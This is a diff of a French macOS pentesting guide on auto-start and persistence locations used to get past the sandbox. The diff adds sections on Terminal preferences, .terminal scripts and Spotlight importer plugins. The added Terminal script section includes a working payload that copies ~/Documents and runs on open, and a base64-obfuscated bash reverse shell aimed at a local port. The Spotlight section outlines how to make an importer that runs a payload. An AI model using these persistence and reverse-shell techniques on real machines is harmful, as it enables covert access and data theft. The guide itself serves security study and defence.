@@ -115,11 +115,11 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 * `/etc/profile` (n'a pas fonctionné)
 * `~/.profile` (n'a pas fonctionné)
 * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-* **Déclencheur**: Censé être déclenché avec xterm, mais il **n'est pas installé** et même après l'installation, cette erreur est affichée: xterm: `DISPLAY is not set`
+* **Déclencheur**: Censé être déclenché avec xterm, mais il **n'est pas installé** et même après l'installation, cette erreur est affichée : xterm: `DISPLAY is not set`
 
 #### Description et exploitation
 
-Les fichiers de démarrage du shell sont exécutés lorsque notre environnement shell comme `zsh` ou `bash` est en train de **démarrer**. De nos jours, macOS utilise par défaut `/bin/zsh`, et **chaque fois que nous ouvrons `Terminal` ou nous connectons en SSH** sur l'appareil, c'est l'environnement shell dans lequel nous sommes placés. `bash` et `sh` sont toujours disponibles, mais ils doivent être spécifiquement démarrés.
+Les fichiers de démarrage du shell sont exécutés lorsque notre environnement de shell comme `zsh` ou `bash` est en train de **démarrer**. De nos jours, macOS utilise par défaut `/bin/zsh`, et **chaque fois que nous ouvrons `Terminal` ou nous connectons en SSH** sur l'appareil, c'est l'environnement de shell dans lequel nous sommes placés. `bash` et `sh` sont toujours disponibles, mais ils doivent être spécifiquement démarrés.
 
 La page de manuel de zsh, que nous pouvons lire avec **`man zsh`**, contient une longue description des fichiers de démarrage.
 ```bash
@@ -165,15 +165,24 @@ Pour **ajouter une application à cette liste**, vous pouvez utiliser :
 -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
 ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-### Terminal
+### Préférences du Terminal
 
-Dans **`~/Library/Preferences`**, les préférences de l'utilisateur dans les applications sont stockées. Certaines de ces préférences peuvent contenir une configuration pour **exécuter d'autres applications/scripts**.
+* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
+
+#### Emplacement
+
+* **`~/Library/Preferences/com.apple.Terminal.plist`**
+* **Déclencheur**: Ouvrir le Terminal
+
+#### Description et Exploitation
+
+Dans **`~/Library/Preferences`**, sont stockées les préférences de l'utilisateur dans les applications. Certaines de ces préférences peuvent contenir une configuration pour **exécuter d'autres applications/scripts**.
 
 Par exemple, le Terminal peut exécuter une commande au démarrage :
 
 <figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>
 
-Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** comme ceci :
+Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** de la manière suivante :
 ```bash
 [...]
 "Window Settings" => {
@@ -204,10 +213,55 @@ Vous pouvez l'ajouter depuis la ligne de commande avec :
 ```
 {% endcode %}
 
-### Plugins Audio
+### Scripts du Terminal
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
-Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+* Utiles pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
+
+#### Emplacement
+
+* **N'importe où**
+* **Déclencheur** : Ouvrir le Terminal
+
+#### Description et Exploitation
+
+Si vous créez un script **`.terminal`** et l'ouvrez, l'application **Terminal** sera automatiquement invoquée pour exécuter les commandes indiquées. Si l'application Terminal dispose de certains privilèges spéciaux (comme TCC), votre commande sera exécutée avec ces privilèges spéciaux.
+
+Essayez avec :
+```bash
+# Prepare the payload
+cat > /tmp/test.terminal << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>CommandString</key>
+<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
+<key>ProfileCurrentVersion</key>
+<real>2.0600000000000001</real>
+<key>RunCommandAsShell</key>
+<false/>
+<key>name</key>
+<string>exploit</string>
+<key>type</key>
+<string>Window Settings</string>
+</dict>
+</plist>
+EOF
+
+# Trigger it
+open /tmp/test.terminal
+
+# Use something like the following for a reverse shell:
+<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
+```
+{% hint style="danger" %}
+Si le terminal dispose d'un **Accès complet au disque**, il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre de terminal).
+{% endhint %}
+
+### Plugins audio
+
+Writeup : [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
+Writeup : [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
 #### Emplacement
 
@@ -225,11 +279,11 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 #### Description
 
-Selon les writeups précédents, il est possible de **compiler certains plugins audio** et de les charger.&#x20;
+Selon les writeups précédents, il est possible de **compiler certains plugins audio** et de les charger.
 
 ### Plugins QuickLook
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
+Writeup : [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
 
 * Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
 
@@ -250,10 +304,10 @@ Il est possible de compiler votre propre plugin QuickLook, de le placer dans l'u
 ### ~~Hooks de connexion/déconnexion~~
 
 {% hint style="danger" %}
-Cela n'a pas fonctionné pour moi, ni avec le LoginHook utilisateur ni avec le LogoutHook root
+Cela n'a pas fonctionné pour moi, ni avec le LoginHook utilisateur ni avec le LogoutHook root.
 {% endhint %}
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
+**Writeup** : [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
 
 Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
 
@@ -291,29 +345,29 @@ defaults delete com.apple.loginwindow LogoutHook
 ```
 L'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
 
-## Contournement conditionnel de la sandbox
+## Contournement conditionnel du sandbox
 
 {% hint style="success" %}
-Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner la sandbox, ce qui vous permet d'exécuter simplement quelque chose en l'écrivant dans un fichier et en vous attendant à des conditions pas super courantes comme des programmes spécifiques installés, des actions ou des environnements d'utilisateur "non courants".
+Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner le sandbox, ce qui vous permet d'exécuter simplement quelque chose en l'écrivant dans un fichier et en vous attendant à des conditions pas super courantes comme des programmes spécifiques installés, des actions ou des environnements utilisateur "non courants".
 {% endhint %}
 
 ### Cron
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
+* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Cependant, vous devez être capable d'exécuter le binaire `crontab`
 * Ou être root
 
 #### Emplacement
 
 * **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-* Accès en écriture directe nécessitant les droits root. Aucun droit root requis si vous pouvez exécuter `crontab <fichier>`
-* **Déclencheur** : Dépend de la tâche cron
+* Accès en écriture directe nécessitant les droits root. Aucun accès root requis si vous pouvez exécuter `crontab <fichier>`
+* **Déclencheur**: Dépend de la tâche cron
 
 #### Description et exploitation
 
-Listez les tâches cron de l'**utilisateur actuel** avec :
+Listez les tâches cron de l'**utilisateur actuel** avec:
 ```bash
 crontab -l
 ```
@@ -433,16 +487,16 @@ EOF
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
 
-* Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
+* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Mais ssh doit être activé et utilisé
 
 #### Emplacement
 
 * **`~/.ssh/rc`**
-* **Déclencheur** : Connexion via ssh
+* **Déclencheur**: Connexion via ssh
 * **`/etc/ssh/sshrc`**
 * Nécessite les droits root
-* **Déclencheur** : Connexion via ssh
+* **Déclencheur**: Connexion via ssh
 
 #### Description et Exploitation
 
@@ -450,7 +504,7 @@ Par défaut, sauf si `PermitUserRC no` est spécifié dans `/etc/ssh/sshd_config
 
 #### Description
 
-Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d'écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté lorsque xbar est démarré :
+Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d'écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté lorsque xbar est démarré:
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -800,7 +854,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.g
 * `~/Library/ColorPickers`
 * Déclencheur : Utilisation du sélecteur de couleurs
 
-#### Description et Exploit
+#### Description et Exploitation
 
 **Compilez un bundle** de sélecteur de couleurs avec votre code (vous pouvez utiliser [**celui-ci par exemple**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructeur (comme dans la section [Économiseur d'écran](macos-auto-start-locations.md#screen-saver)) et copiez le bundle dans `~/Library/ColorPickers`.
 
@@ -821,8 +875,8 @@ Notez que le binaire chargé avec votre bibliothèque a un **sandbox très restr
 
 ### Plugins de synchronisation Finder
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
-**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
+**Article**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
+**Article**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
 
 * Utile pour contourner le sandbox : **Non, car vous devez exécuter votre propre application**
 
@@ -947,6 +1001,91 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 @end
 ```
+### Plugins Spotlight
+
+Utiles pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
+
+* Mais vous finirez dans un sandbox d'application
+
+#### Emplacement
+
+* `~/Library/Spotlight/`
+* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
+* `/Library/Spotlight/`
+* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
+* Nécessite les droits d'administrateur
+* `/System/Library/Spotlight/`
+* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
+* Nécessite les droits d'administrateur
+* `Some.app/Contents/Library/Spotlight/`
+* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
+* Nécessite une nouvelle application
+
+#### Description et exploitation
+
+Spotlight est la fonctionnalité de recherche intégrée à macOS, conçue pour offrir aux utilisateurs un accès rapide et complet aux données de leur ordinateur.\
+Pour faciliter cette capacité de recherche rapide, Spotlight maintient une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, permettant des recherches rapides à la fois dans les noms de fichiers et leur contenu.
+
+Le mécanisme sous-jacent de Spotlight implique un processus central appelé 'mds', qui signifie **'metadata server'**. Ce processus orchestre l'ensemble du service Spotlight. En complément, il existe plusieurs démons 'mdworker' qui effectuent diverses tâches de maintenance, telles que l'indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles grâce aux plugins d'importation Spotlight, ou **"bundles .mdimporter"**, qui permettent à Spotlight de comprendre et d'indexer le contenu d'une large gamme de formats de fichiers.
+
+Les plugins ou bundles **`.mdimporter`** sont situés aux emplacements mentionnés précédemment et si un nouveau bundle apparaît, il est chargé en quelques minutes (aucun redémarrage de service n'est nécessaire). Ces bundles doivent indiquer les **types de fichiers et les extensions qu'ils peuvent gérer**, de cette manière, Spotlight les utilisera lorsqu'un nouveau fichier avec l'extension indiquée sera créé.
+
+Il est possible de **trouver tous les `mdimporters`** chargés en exécutant :
+```bash
+mdimport -L
+Paths: id(501) (
+"/System/Library/Spotlight/iWork.mdimporter",
+"/System/Library/Spotlight/iPhoto.mdimporter",
+"/System/Library/Spotlight/PDF.mdimporter",
+[...]
+```
+Et par exemple, **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ce type de fichiers (extensions `.iba` et `.book`, entre autres) :
+```json
+plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
+
+[...]
+"CFBundleDocumentTypes" => [
+0 => {
+"CFBundleTypeName" => "iBooks Author Book"
+"CFBundleTypeRole" => "MDImporter"
+"LSItemContentTypes" => [
+0 => "com.apple.ibooksauthor.book"
+1 => "com.apple.ibooksauthor.pkgbook"
+2 => "com.apple.ibooksauthor.template"
+3 => "com.apple.ibooksauthor.pkgtemplate"
+]
+"LSTypeIsPackage" => 0
+}
+]
+[...]
+=> {
+"UTTypeConformsTo" => [
+0 => "public.data"
+1 => "public.composite-content"
+]
+"UTTypeDescription" => "iBooks Author Book"
+"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
+"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
+"UTTypeTagSpecification" => {
+"public.filename-extension" => [
+0 => "iba"
+1 => "book"
+]
+}
+}
+[...]
+```
+{% hint style="danger" %}
+Si vous vérifiez le Plist d'autres `mdimporter`, vous ne trouverez peut-être pas l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) intégré et il n'a pas besoin de spécifier les extensions.
+
+De plus, les plugins par défaut du système ont toujours la priorité, donc un attaquant ne peut accéder qu'aux fichiers qui ne sont pas indexés par les `mdimporters` d'Apple.
+{% endhint %}
+
+Pour créer votre propre importateur, vous pouvez commencer par ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) puis changer le nom, les **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** pour prendre en charge l'extension que vous souhaitez supporter et les refléter dans **`schema.xml`**.\
+Ensuite, **modifiez** le code de la fonction **`GetMetadataForFile`** pour exécuter votre charge utile lorsqu'un fichier avec l'extension traitée est créé.
+
+Enfin, **construisez et copiez votre nouveau `.mdimporter`** dans l'un des emplacements précédents et vous pouvez vérifier s'il est chargé en **surveillant les journaux** ou en vérifiant **`mdimport -L.`**
+
 ### ~~Panneau de préférences~~
 
 {% hint style="danger" %}
@@ -956,7 +1095,7 @@ Il semble que cela ne fonctionne plus.
 Rédaction : [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
 
 * Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
-* Nécessite une action spécifique de l'utilisateur
+* Cela nécessite une action utilisateur spécifique
 
 #### Emplacement
 
@@ -971,7 +1110,7 @@ Il semble que cela ne fonctionne plus.
 ## Contournement du sandbox root
 
 {% hint style="success" %}
-Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner le **sandbox** qui vous permet d'exécuter simplement quelque chose en l'écrivant dans un fichier en tant que **root** et/ou en nécessitant d'autres **conditions étranges**.
+Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner le sandbox qui vous permettent simplement d'exécuter quelque chose en l'écrivant dans un fichier en tant que root et/ou en nécessitant d'autres conditions étranges.
 {% endhint %}
 
 ### Périodique
@@ -984,15 +1123,15 @@ Rédaction : [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevil
 #### Emplacement
 
 * `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
-* Requiert les droits root
+* Nécessite d'être root
 * **Déclencheur** : Lorsque le moment arrive
 * `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
-* Requiert les droits root
+* Nécessite d'être root
 * **Déclencheur** : Lorsque le moment arrive
 
 #### Description et exploitation
 
-Les scripts périodiques (**`/etc/periodic`**) sont exécutés en raison des **daemons de lancement** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Notez que les scripts stockés dans `/etc/periodic/` sont **exécutés** en tant que **propriétaire du fichier**, donc cela ne fonctionnera pas pour une élévation de privilèges potentielle.
+Les scripts périodiques (**`/etc/periodic`**) sont exécutés en raison des **daemons de lancement** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Notez que les scripts stockés dans `/etc/periodic/` sont **exécutés** en tant que **propriétaire du fichier**, donc cela ne fonctionnera pas pour une éventuelle élévation de privilèges.
 
 {% code overflow="wrap" %}
 ```bash
@@ -1235,14 +1374,14 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.
 * Nécessite les droits root
 * **Déclencheur**: Avec XQuartz
 
-#### Description & Exploit
+#### Description & Exploitation
 
 XQuartz n'est **plus installé dans macOS**, donc si vous voulez plus d'informations, consultez le writeup.
 
 ### ~~kext~~
 
 {% hint style="danger" %}
-Il est si compliqué d'installer un kext même en tant que root que je ne le considérerai pas pour échapper aux sandbox ou même pour la persistance (à moins que vous ayez une exploit)
+Il est si compliqué d'installer un kext même en tant que root que je ne le considérerai pas comme une échappatoire aux sandbox ou même pour la persistance (à moins que vous ayez une exploitation)
 {% endhint %}
 
 #### Emplacement
@@ -1254,7 +1393,7 @@ Pour installer un KEXT en tant qu'élément de démarrage, il doit être **insta
 * `/Library/Extensions`
 * Fichiers KEXT installés par des logiciels tiers
 
-Vous pouvez lister les fichiers kext actuellement chargés avec:
+Vous pouvez répertorier les fichiers kext actuellement chargés avec:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
